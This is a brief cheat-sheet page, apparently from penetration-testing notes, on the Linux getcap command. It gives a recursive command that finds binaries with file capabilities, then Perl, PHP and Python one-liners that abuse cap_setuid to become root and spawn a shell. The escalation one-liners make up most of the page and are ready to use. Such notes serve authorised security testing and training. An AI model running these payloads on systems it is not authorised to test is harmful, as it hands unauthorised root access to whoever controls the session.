---
title: Getcap
desc: Displays the capabilities on the queried files.
tags: [Linux, PrivEsc]
alts: [Find, Setcap]
website:
render_with_liquid: false
---

## Basic

```sh
getcap -r / 2>/dev/null
```

<br />

## Privilege Escalation (get 'root')

```sh
# Perl (ex. /usr/bin/perl = cap_setuid+ep)
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# PHP
php -r "posix_setuid(0); system('$CMD');"

# Python (ex. /usr/bin/python = cap_setuid+ep)
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```